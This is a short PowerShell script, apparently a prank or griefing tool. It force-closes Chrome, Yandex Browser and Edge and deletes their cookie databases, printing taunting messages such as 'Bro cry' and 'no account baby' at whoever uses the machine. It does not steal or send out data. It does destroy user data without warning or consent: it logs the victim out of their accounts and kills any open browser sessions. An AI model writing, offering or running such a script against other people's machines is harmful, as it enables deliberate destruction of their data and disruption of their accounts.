# Остановить процессы браузеров
$browsers = @("chrome", "browser", "msedge")
foreach ($browser in $browsers) {
    Stop-Process -Name $browser -Force -ErrorAction SilentlyContinue
}

# Check browsers
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$yandexPath = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Network\Cookies"
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"

# Clean coockie (no account baby): Layer 1
function Clear-BrowserCookies {
    param (
        [string]$browserPath,
        [string]$browserName
    )
    
    if (Test-Path $browserPath) {
        try {
            Remove-Item $browserPath -Force
            Write-Host "Bro cry, cookies cleaned from $browserName"
        }
        catch {
            Write-Host "nah, $browserName shitty browser"
        }
    }
    else {
        Write-Host "$browserName not on your bad pc"
    }
}

# Clean coockie (no account baby): Layer 2
Clear-BrowserCookies -browserPath $chromePath -browserName "Google Chrome"
Clear-BrowserCookies -browserPath $yandexPath -browserName "Yandex Browser"
Clear-BrowserCookies -browserPath $edgePath -browserName "Microsoft Edge"

Write-Host "bro cry"
